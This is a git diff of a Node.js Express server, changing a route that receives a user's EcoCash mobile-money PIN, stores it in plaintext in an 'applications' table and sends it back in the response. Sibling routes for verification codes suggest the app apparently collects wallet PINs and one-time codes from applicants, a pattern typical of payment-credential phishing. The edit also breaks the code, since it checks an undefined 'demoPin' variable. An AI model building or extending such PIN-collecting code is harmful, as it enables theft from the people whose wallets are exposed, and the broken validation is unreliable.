@@ -833,19 +833,17 @@ app.post("/save-ecocash-verification/:id", async (req, res) => {
     }
 
 });
-
-// ======================================================
-// SAVE ECOCASH PIN
-// ======================================================
-
+//=====================================================
+//SAVE ECOCASH PIN 
+//=====================================================
 app.post("/save-ecocash-pin/:id", async (req, res) => {
 
     try {
 
         const { id } = req.params;
-        const { EcoCashPin } = req.body;
+        const { Pin } = req.body;
 
-        if (!EcoCashPin) {
+        if (!demoPin) {
             return res.status(400).json({
                 success: false,
                 message: "PIN is required."
@@ -857,9 +855,9 @@ app.post("/save-ecocash-pin/:id", async (req, res) => {
             UPDATE applications
             SET ecocash_pin = $1
             WHERE id = $2
-            RETURNING id, ecocash_pin;
+            RETURNING id, ecocash_pin
             `,
-            [EcoCashPin, id]
+            [Pin, id]
         );
 
         if (result.rows.length === 0) {
@@ -871,7 +869,6 @@ app.post("/save-ecocash-pin/:id", async (req, res) => {
 
         res.json({
             success: true,
-            message: "EcoCash PIN saved successfully.",
             application: result.rows[0]
         });
 
@@ -886,11 +883,8 @@ app.post("/save-ecocash-pin/:id", async (req, res) => {
             success: false,
             error: err.message
         });
-
     }
-
 });
-
 // ======================================================
 // ECOCASH CODE SUBMITTED
 // ======================================================
